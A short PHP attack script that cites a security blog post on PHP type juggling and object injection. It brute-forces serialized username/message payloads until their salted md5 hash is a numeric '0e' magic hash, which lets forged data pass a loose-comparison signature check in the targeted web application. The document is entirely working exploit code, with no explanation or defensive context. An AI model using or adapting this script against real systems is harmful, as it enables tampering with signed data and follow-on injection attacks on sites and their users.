<?php
# https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/

set_time_limit(0);
define('HASH_ALGO', 'md5');
define('PASSWORD_MAX_LENGTH', 8);
 
$charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
$str_length = strlen($charset);
 
function check($garbage)
{
    $length = strlen($garbage);
    $salt = "033bc11c2170b83b2ffaaff1323834ac40406b79";
    $payload = 'a:2:{s:13:":new:username";s:'.$length.':"'.$garbage.'";s:12:":new:message";s:7:"taquito";}';
    #echo "Testing: " . $payload . "\n";
        $hash = md5($payload.$salt);
        $pre = "0e";
 
    if (substr($hash, 0, 2) === $pre) {
        if (is_numeric($hash)) {
          echo "$payload - $hash\n";
        }
      }
 
}
 
function recurse($width, $position, $base_string)
{
        global $charset, $str_length;
 
        for ($i = 0; $i < $str_length; ++$i) {
                if ($position  < $width - 1) {
                        recurse($width, $position + 1, $base_string . $charset[$i]);
                }
                check($base_string . $charset[$i]);
        }
}
 
for ($i = 1; $i < PASSWORD_MAX_LENGTH + 1; ++$i) {
        echo "Checking passwords with length: $i\n";
        recurse($i, 0, '');
}
 
?>